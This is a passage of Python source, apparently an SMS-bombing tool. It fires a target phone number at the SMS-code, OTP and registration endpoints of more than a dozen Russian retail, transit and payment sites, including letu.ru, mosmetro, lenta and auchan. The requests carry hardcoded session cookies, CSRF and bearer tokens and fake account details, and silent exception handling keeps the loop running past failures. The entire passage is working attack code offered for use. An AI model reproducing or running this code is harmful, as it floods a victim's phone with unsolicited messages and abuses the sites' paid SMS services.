                'cookie': 'anonymous_user_cart=; anonymous_user_last_viewed=; anonymous_user_wishlist=; anonymous_user_city=; COOKIE-BEARER=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1NTY2MjU3NjA4OSIsImF1dGhvcml0aWVzIjoiUk9MRV9BTk9OWU1PVVMiLCJzaXRlSWQiOiJzdG9yZU1vYmlsZVJVIiwiaWF0IjoxNjY3NTA1ODIzLCJleHAiOjE2Njc1OTIyMjN9.BSzBym8eES4E80HM7Aejqq5BMzS-3pJNxmW8uSPMssqRBZXe-RHWxoVJ2_x7N_ptG0NW-z73EtvKM4uj7d-AeQ; JSESSIONID=RIVGvSdI6jXgarX8Qdj6bmxpy6Q_.letu-wru-07; language=ru-RU; cityDetected=true; ssaid=a6998a60-5bb2-11ed-a966-139fd8fbcf9d; iap.uid=3460084562364d5c80ba900934b73c9c; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; cityGuessed=true; __tld__=null',
                'origin': 'https://www.letu.ru',
                'referer': 'https://www.letu.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw'
            }

            payload = {
                "phoneNumber": num2,
                "captcha": ""
            }

            requests.post('https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU',
                          json=payload, headers=header)

        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ajax': 'true',
                'content-length': '100',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'PHPSESSID=sCKb78l6M2hNjDVIsEtRANBWUitsWymC; BITRIX_SM_SALE_UID=31225761; BITRIX_SM_EVRAZ_CURRENT_LOC_ID=93; BITRIX_SM_EVRAZ_SEND_GEO_LOCATION_REQUEST=Y; BITRIX_SM_EVRAZ_LAST_IP_V2=92.204.175.94; operator=0; authorization=0; BITRIX_SM_EVRAZ_LOC_ID=93; BITRIX_SM_EVRAZ_LOC_CITY_NAME=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; BITRIX_SM_EVRAZ_CITY=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1',
                'origin': 'https://spb.evraz.market',
                'referer': 'https://spb.evraz.market/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-bitrix-csrf-token': '79eb9fa06a250d301c9cdc119acc4a2e'
            }

            payload = {
                'userPhone': num2,
                'captchaCode': '',
                'captchaWord': '',
                'sessid': '79eb9fa06a250d301c9cdc119acc4a2e'
            }

            requests.post(
                'https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms',
                data=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5} {6}{7}{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '188',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'gmid=gmid.ver4.AcbHIFuqlw.5hXFNUlJJO6lpsO40ROnr3Ai-fvqJftkblAnzaKQV1wNpjBaUSZ3Ky8LkebG7zZY.lm7xZTMYoYl3U444u1FpRfFx48bjFcZxrLdie8sUen8l9VDdfETPtIef7eY1wegBPFuXaiVJ0ugc29jo2o24Mw.sc3; ucid=xQlNT1fYJWW8JN_FjKHIvg; hasGmid=ver4',
                'origin': 'https://cdns.eu1.gigya.com',
                'referer': 'https://cdns.eu1.gigya.com/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user
            }

            payload = {
                'phoneNumber': num2,
                'lang': 'ru',
                'APIKey': '4_eXEZkSmgY277qYb5XXqALQ',
                'source': 'showScreenSet',
                'sdk': 'js_latest',
                'authMode': 'cookie',
                'pageURL': 'https://mega.ru/',
                'sdkBuild': '13432',
                'format': 'json'
            }

            requests.post('https://accounts.eu1.gigya.com/accounts.otp.sendCode', data=payload, headers=header)
        except:
            pass
        try:
            num2 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '2168',
                'content-type': 'application/json',
                'cookie': 'city=spb; uid=8ABABAB98EEC626328515E670203D03D; sid=ubq6imNi7I5nXlEoPdADAg==; _gcl_au=1.1.1810282558.1667427483; _ga=GA1.2.648055991.1667427484; tmr_lvid=10a4fa8a9fdf0837aa2f832f43e0c879; tmr_lvidTS=1667427483587; _ym_uid=1667427484751794767; _ym_d=1667427484; st_uid=aecf6f00f48400b66c1f81734929fecf; advcake_track_id=49bca5f7-e704-1a53-a041-5e968b832d6e; advcake_session_id=ff6fe018-2736-375f-542e-f888f3e85acb; _tt_enable_cookie=1; _ttp=c729a64e-7d87-49df-b327-4af15846ef99; geo_city_confirmed=yes; tmr_reqNum=5; _ga_FRVD1KH7N7=GS1.1.1667427483.1.1.1667427967.60.0.0; site_version=desktop; first_hit_url=%2F; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiMWVkNjE5NTctNjczYy00NzU3LWE4ZDUtYTk0MDg3NDIyN2IzIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6IjE0OWFlMTRmLWIzOTItNGU4Ny04Zjk5LTVmYzg2YmE4MTY1YiIsImlhdCI6MTY2NzUyMzQ5OCwiZXhwIjoxNjY3NTI0MDk4LCJqdGkiOiIxZWQ2MTk1Ny02NzNjLTQ3NTctYThkNS1hOTQwODc0MjI3YjMifQ.wujVLf14hPECV59EpP00QkGCod8GcxW1eO_YTLVGZ_4; wtfId=1724716-1667523501.134-92.204.175.94-21808; ets=%2F%2C%2C1667523504',
                'origin': 'https://spb.profi.ru',
                'referer': 'https://spb.profi.ru/cabinet/login/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-app-id': 'PROFI',
                'x-new-auth-compatible': '1',
                'x-requested-with': 'XMLHttpRequest',
                'x-wtf-id': '1724716-1667523497.326-92.204.175.94-21808'
            }

            payload = {"query":"#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}","variables":{"type":"phone","initialState":{"phoneNumber":num2,"defaultOrderCityId":"spb-prfr","currentHost":"https://spb.profi.ru"}}}

            requests.post('https://profi.ru/graphql', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '164',
                'content-type': 'application/json; charset=UTF-8',
                'cookie': 'route=1667523751.397.1119.234211|4d33fc6b928f7f8ef63e5c30cfa97296; WELCOMESESSID=npilc00ks6r8d33jioj85hdkgu; _user_location=3eaf80b99b78f648b2ef3159af22d67d1551ea0424141f70965891ede650e8e3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_user_location%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; utm=4bbcd7bfd0c9102467242ca243ed5d844d77cb0e29dba11fbac5c81df541132ea%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22utm%22%3Bi%3A1%3Bs%3A96%3A%22%7B%22utm_source%22%3A%22Direct%22%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%2C%22utm_content%22%3Anull%7D%22%3B%7D; JivoSiteLoaded=1; cf_chl_2=00bf271650faddc; cf_chl_prog=x14; cf_clearance=66f7f85a2bd285f4b8c6b873a9d919d965a2bb05-1667523760-0-150; _customer_id=970273e4df0f1d0b3988550e50021c3446dbfa37abd26fc1ad08f511bc416e9da%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22_customer_id%22%3Bi%3A1%3Bs%3A9%3A%22886775909%22%3B%7D; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D',
                'origin': 'https://abc.ru',
                'referer': 'https://abc.ru/registration/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {"phone": "+"+number, "country_id": 1, "scenario": "registration",
                       "_csrf": "Z5ef-nmzUVs9ilw9nFdmzh5dp84dS6m7zpcIo-Glwk43-PC2SvhkNA_oZWz3Aij7JhDh9jAa7On23D7uq86oeA=="}

            requests.post('https://abc.ru/clientapi/v1/user/phone-sms/', json=payload, headers=header)
        except:
            pass
        try:
            num2 = '+7 ({0}) {1}-{2}-{3}'.format(number[1:4], number[4:7], number[7:9], number[9:11])

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '102',
                'content-type': 'application/json',
                'cookie': 'qrator_jsr=1667524522.276.189jw3Ua6j7ldN27-i6hrda4u2c9ra76q6gb76mrc5u35q05e-00; qrator_jsid=1667524522.276.189jw3Ua6j7ldN27-fim6nq6jj3t93fqfhlc7uqqsr7ilrnfe; qrator_ssid=1667524522.885.A5rxWM5wTtJvqRXq-cjsj0ugg8h4m2quh0eeam1f77iar8g66; CUPIS-ReqUrl=eyJtZXRob2QiOiJHRVQiLCJyZWRpcmVjdFVybCI6Imh0dHBzOi8vd2FsbGV0LjFjdXBpcy5ydS9tYWluIn0=; CUPIS-SESSION-ID=b1a1ed8f-f90b-4cb6-b882-eac960c2d08d',
                'origin': 'https://wallet.1cupis.ru',
                'referer': 'https://wallet.1cupis.ru/signup',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-csrf-token': '111d4654-5256-4fdf-ae3d-86737e1e365d'
            }

            payload = {
                "confirm": "on",
                "email": "hrufmdo_23@hotmail.com",
                "password": "Hoho_HO123",
                'phone': num2
            }

            requests.post('https://wallet.1cupis.ru/doSendSms', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '505',
                'content-type': 'application/json',
                'cookie': '.AspNetCore.Culture=c%3Dru%7Cuic%3Dru',
                'origin': 'https://auth.mosmetro.ru',
                'referer': 'https://auth.mosmetro.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Df1dac608-dd35-4717-8cbb-18e2f7a1d522%26redirect_uri%3Dhttps%253A%252F%252Flk.mosmetro.ru%252Fexternal-auth%26response_type%3Dcode%26scope%3Dopenid%2520offline_access%2520nbs.ppa%26code_challenge%3Df3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8%26code_challenge_method%3DS256%26nonce%3D638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi%26state%3Dfc7kxm178qekphufyqkq0k%26ui_locales%3Dru%26acr_values%3Dtheme%253Alight&providers=%5B%0A%20%20%22yandex%22,%0A%20%20%22apple%22,%0A%20%20%22sudir%22,%0A%20%20%22google%22,%0A%20%20%22vkontakte%22,%0A%20%20%22local%22%0A%5D',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {"login": number,
                       "returnUrl": "/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522&redirect_uri=https%3A%2F%2Flk.mosmetro.ru%2Fexternal-auth&response_type=code&scope=openid%20offline_access%20nbs.ppa&code_challenge=f3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8&code_challenge_method=S256&nonce=638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi&state=fc7kxm178qekphufyqkq0k&ui_locales=ru&acr_values=theme%3Alight"}

            requests.post('https://auth.mosmetro.ru/api/auth/login/sms', json=payload, headers=header)
        except:
            pass
        try:
            num2 = f"+7 ({number[1:4]}) {number[4:7]}-{number[7:]}"

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '0',
                'Cookie': 'gulliver_session=cL6HDZN0bcKhtksWvCwFQJpwy58KLkAgzHGnfX56; advcake_track_id=5a31566b-6387-bbd1-3c4e-14155399cef8; advcake_session_id=c4ffe14b-640a-9160-4733-a21d0f6fd6ab; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; mgo_uid=ZAZgCnpfZdopwKpftcSS',
                'Host': 'www.gulliver.ru',
                'Origin': 'https://www.gulliver.ru',
                'Referer': 'https://www.gulliver.ru/brands/gulliver',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user
            }

            r = requests.post('https://www.gulliver.ru/api/authorization/phone/token', headers=header)
            token0 = json.loads(r.text)
            token = token0['data']['token']

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '696',
                'Content-Type': 'application/json;charset=UTF-8',
                'Cookie': 'gulliver_session=cL6HDZN0bcKhtksWvCwFQJpwy58KLkAgzHGnfX56; advcake_track_id=5a31566b-6387-bbd1-3c4e-14155399cef8; advcake_session_id=c4ffe14b-640a-9160-4733-a21d0f6fd6ab; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; mgo_uid=ZAZgCnpfZdopwKpftcSS',
                'Host': 'www.gulliver.ru',
                'Origin': 'https://www.gulliver.ru',
                'Referer': 'https://www.gulliver.ru/brands/gulliver',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user
            }

            payload = {
                "agree_with_new_loyalty": "on",
                "birthdate": "12-12-2000",
                "email": "023rjjfj_ww@hotmail.com",
                "name": "Вася",
                "password": "Hoho_HO123",
                "password_repeat": "Hoho_HO123",
                "phone": num2,
                "sex": "male",
                "token": token
            }

            requests.post(
                'https://www.gulliver.ru/api/registration/phone/code_request',
                json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '117',
                'content-type': 'application/json',
                'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==',
                'origin': 'https://spb.uteka.ru',
                'platform': 'Desktop',
                'referer': 'https://spb.uteka.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'version': 'b835b033'
            }

            payload = {"jsonrpc": "2.0", "id": 8, "method": "auth.GetCode",
                       "params": {"phone": number[1:], "mustExist": False, "sendRealSms": True}}

            requests.post('https://spb.uteka.ru/rpc/?method=auth.GetCode', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'authorization': 'Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn',
                'content-length': '220',
                'content-type': 'application/json',
                'origin': 'https://elementaree.ru',
                'referer': 'https://elementaree.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user
            }

            payload = {"operationName":"phoneVerification","variables":{"phone":number},"query":"mutation phoneVerification($phone: String!) {\n  phoneVerification(phone: $phone) {\n    success\n    interval\n    __typename\n  }\n}\n"}

            requests.post('https://api-new.elementaree.ru/graphql', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Client': 'angular_web_0.0.2',
                'Connection': 'keep-alive',
                'Content-Length': '82',
                'Content-Type': 'text/plain',
                'Cookie': 'qrator_msid=1667526234.775.XKeTKEPsW4ov4g4D-6qn2qar0j8pjc4gatudrriv26nb4dhqp; Utk_DvcGuid=50e83205-9a55-845c-3d3e-363cdc1925e4; Utk_SessionToken=3928A6E837779529C395A626B52E49E2; User_Agent=Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2012_2_1)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36; Is_Search_Bot=false; Utk_MrkGrpTkn=1FCF76D07C49A5ED62F64683C21656E9; agree_with_cookie=true; Utk_SssTkn=3928A6E837779529C395A626B52E49E2',
                'Deviceid': '50e83205-9a55-845c-3d3e-363cdc1925e4',
                'Host': 'moscow.online.lenta.com',
                'Origin': 'https://moscow.online.lenta.com',
                'Referer': 'https://moscow.online.lenta.com/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'SessionToken': '3928A6E837779529C395A626B52E49E2',
                'User-Agent': user,
                'x-domain': 'moscow',
                'x-retail-brand': 'lo'
            }

            payload = {"method":"authCodeSend","params":{"phone":number},"jsonrpc":"2.0","id":12}

            requests.post('https://moscow.online.lenta.com/jrpc', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'access_token': 'eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2Njc1MjY0NzEsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2NzUzMDI0NzF9.9Fgzk9RrWW82n5F2uUggsAyBuZHc_fqWZp-GOxph5qk',
                'Connection': 'keep-alive',
                'Cookie': 'qrator_jsr=1667526415.893.MfERRj629UrSfHpf-8rtud06upbosderhvl5g1ef3390ea0d5-00; qrator_jsid=1667526415.893.MfERRj629UrSfHpf-jm7luqtsup8el3ol2j60phv7fkan9i6u; qrator_ssid=1667526416.258.OYUlKh0aP6DY18Jw-u4fv9j20mlns9csfk011vboa84jsc382; isEreceiptedPopupShown_=true; ab_test_popup_delivery=test_group; motopopupforeveryone=1; isAddressPopupShown_=true; region_id=1; merchant_ID_=1; methodDelivery_=1; _GASHOP=001_Mitishchi; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; tmr_lvid=1af3ad7f44323452a463acb0f7f4e6ba; tmr_lvidTS=1667526432573; _ym_uid=166752643344618027; _ym_d=1667526433; kameleoonVisitorCode=_js_dq2tzq3u66bvzpow; rrpvid=149419622442899; _userGUID=0:la1u6mdr:Ks5DPIpdJXdMpsJ2bfqnyt6SX4WcJDpg; dSesn=36d4984e-ef17-39b9-6c97-f9b8134436c1; _dvs=0:la1u6mdr:OwFvRPS2gUvDudZhy0uiDpFn6wuQj3Eh; _ym_isad=2; rcuid=63646f12e2746a93f2420567; haveChat=true; tmr_detect=0%7C1667526435285; device_id=206053908846.45267; tmr_reqNum=5',
                'Host': 'www.auchan.ru',
                'phone': number,
                'Referer': 'https://www.auchan.ru/auth/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'source': '4',
                'User-Agent': user
            }

            requests.get('https://www.auchan.ru/v1/cmd/clientprofile/checkphone', headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '141',
                'content-type': 'application/json',
                'cookie': '_ga=GA1.2.2080011146.1667526756; _gid=GA1.2.846099629.1667526756; _gat=1; _ym_uid=16675267561046031971; _ym_d=1667526756; _ym_visorc=w; _ym_isad=2; XSRF-TOKEN=eyJpdiI6ImZZTjluOFkrNnZZcGp2ZmN1ckQ2aWc9PSIsInZhbHVlIjoibVRsUDFwb0FlMGt4U2p3dW02UXRLb0o4U3hyNTZIeWJPNWxGbWJhWlhHWm1NK05RaWtsbjhOUWM2VFVrcmo1UWV4eHBzMWJEbnh2OXRJUVBObmFvU2c9PSIsIm1hYyI6ImQ3YmY0ZjI5M2U5ODVkZDNkMzY4MjRiZDBiYjMzNDA0NzZiMTIzZjVmODZiMzA4NmU0N2U0ZmVhYmQ5MWIzNjAifQ%3D%3D; victorialk_session=eyJpdiI6Im02RnkzdThaZmI0RTJZVktJZWt0UkE9PSIsInZhbHVlIjoiWVJSd3g0WFV1bHFvcTFCVFFWTmtXWElKNFBmeHBreWZRMEIxNzhhNUxlSjFybW4wS1VqSU5ZQlFqVEt2V2Y0RVVsUnpyZzZqWTJXUmtoZzRkRlladEE9PSIsIm1hYyI6ImE4NDQ2NDUyMmE2ODliMzNiM2ExZmFjODE1MWI1ZTZjNWNlNmQ4N2NlODU0OWYxMjY3MzU2YWYyODAwYzk4NGUifQ%3D%3D',
                'origin': 'https://lk.victoria-group.ru',
                'referer': 'https://lk.victoria-group.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-csrf-token': 'FSP8p7pYb7YwNMG71KtkOOsC5WSJpcUwNohCfKHA'
            }

            payload = "{\"MobilePhone\":\"+"+number+"\",\"CardNumber\":null,\"AgreeToTerms\":1,\"AllowNotification\":0,\"DeviceId\":\"gl3llll8mih00hxy1xg6j23c\"}"

            requests.post(
                'https://lk.victoria-group.ru/identity/registration', json=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ajax': 'true',
                'content-length': '135',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'PHPSESSID=aYfHl3PCi7BeUusGZoTbM4ifURd4nZQQ; BITRIX_SM_GUEST_ID=42144878; BITRIX_SM_LAST_VISIT=04.11.2022+19%3A38%3A32; BITRIX_SM_SALE_UID=72a9489c1aabb0fde5da4bcb2ddea0c6; region_obl_id=17; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A7%2C%22EXPIRE%22%3A1667595540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D',
                'origin': 'https://zdesapteka.ru',
                'referer': 'https://zdesapteka.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {
                'userPhone': num2,
                'checkWord': '2QI6HY}h%YHc9Mxa6QOmC8htR5',
                'repeat': '0',
                'SITE_ID': 's1',
                'sessid': 'ea30ca83acb3852c7ab2b205a470b4c6'
            }

            requests.post(
                'https://zdesapteka.ru/bitrix/services/main/ajax.php?action=zs%3Amain.ajax.AuthActions.sendAuthCode',
                data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
